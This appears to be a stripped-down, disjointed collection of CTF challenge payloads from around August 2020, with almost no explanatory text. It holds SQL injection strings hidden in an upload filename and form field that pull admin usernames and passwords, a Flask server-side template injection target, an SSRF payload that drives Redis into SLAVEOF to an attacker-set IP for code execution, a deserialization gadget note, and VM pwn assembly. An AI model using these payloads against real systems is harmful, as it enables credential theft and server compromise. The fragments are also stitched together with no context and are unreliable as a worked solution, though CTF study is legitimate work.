XM
Content-Disposition: form-data; name="upfile"; filename="-1'union select 
1,username,3,4,5 from user limit 0,1#.jpg"
oldname=0'union select 1,(select username from `user` where 
`privilege`='admin'),3,4,'5&newname=bbbbbbb
qweqweqwe
oldname=0'union select 1,(select password from `user` where 
`privilege`='admin'),3,4,'5&newname=bbbbbbb
class XCTFGG{
private $method;
    private $args;
    public function __construct($method, $args) {
        $this->method = "login";
        $this->args = array("username"=>"XM","password"=>"qweqweqwe");
    }
}

sessionPHPSESSIDsessionlfi
Date: Sat, 29 Aug 2020 02:20:36 GMT
import flask
from xxxx import flag
app = flask.Flask(**name**)
app.config['FLAG'] = flag
@app.route('/')
def index():
  return open('app.txt').read()
@app.route('/[path:hack](path:hack)')
def hack(hack):
  return flask.render_template_string(hack)
if **name** == '**main**':
  app.run(host='0.0.0.0',port=5000)

url=http://127.0.0.1:6379/%250d%250aAUTH%2520123456%250d%250aSLAVEOF%2520${IP}
%2520${PORT}%250d%250aCONFIG%2520SET%2520dir%2520/tmp/%250d%250aCONFIG%2520SET

com.rometoolsgadgetRCE
PWN
vmpwn
jmp 0x3a5
mov a2, 0x29
syscall 1 //write
mov a0, 0x2020202020202023
mov [buf+0x0],a0
mov a0, 0x6d6f636c65772020
mov [buf+0x8],a0
mov a0, 0x323032206f742065
mov [buf+0x10],a0
mov a0, 0x2046544341472030
mov [buf+0x18],a0
mov a0, 0x2320202020202020
mov [buf+0x20],a0
mov a0, 0xa
mov [buf+0x28],a0
lea a0,[buf+0x0]
push a0
pop a1
mov a0, 0x1
mov a2, 0x29
syscall 1 //write
mov a0, 0x7369687420202023
mov [buf+0x0],a0
mov a0, 0x656d206120736920
mov [buf+0x8],a0
mov a0, 0x7266206567617373
mov [buf+0x10],a0
mov a0, 0x616d206d76206d6f
mov [buf+0x18],a0
mov a0, 0x232020656e696863
mov [buf+0x20],a0
mov a0, 0xa
mov [buf+0x28],a0
lea a0,[buf+0x0]
push a0
pop a1
mov a0, 0x1
mov a2, 0x29
syscall 1 //write
mov a0, 0x2323232323232323
mov [buf+0x0],a0
mov a0, 0x2323232323232323
mov [buf+0x8],a0
mov a0, 0x2323232323232323
mov [buf+0x10],a0
mov a0, 0x2323232323232323
mov [buf+0x18],a0
mov a0, 0x2323232323232323
mov [buf+0x20],a0
mov a0, 0xa
